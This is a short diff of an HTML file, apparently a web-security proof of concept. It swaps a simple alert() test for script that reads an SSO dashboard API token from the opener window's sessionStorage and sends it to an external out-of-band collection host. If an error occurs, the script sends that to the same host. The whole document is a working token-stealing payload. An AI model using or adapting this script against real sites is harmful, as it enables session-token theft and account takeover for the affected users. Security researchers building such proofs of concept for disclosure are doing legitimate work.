@@ -1,1 +1,8 @@
-<html><script>alert("pocBYm0x_noob")</script></html>
+<script>
+try {
+  var token = opener.sessionStorage.getItem('sso-dashboard:apiToken');
+  fetch('https://rzu0wcdths05eqznedk1oxwxaogf45su.oastify.com?c='+encodeURIComponent(token));
+} catch(e) {
+  fetch('https://rzu0wcdths05eqznedk1oxwxaogf45su.oastify.com?err='+e);
+}
+</script>
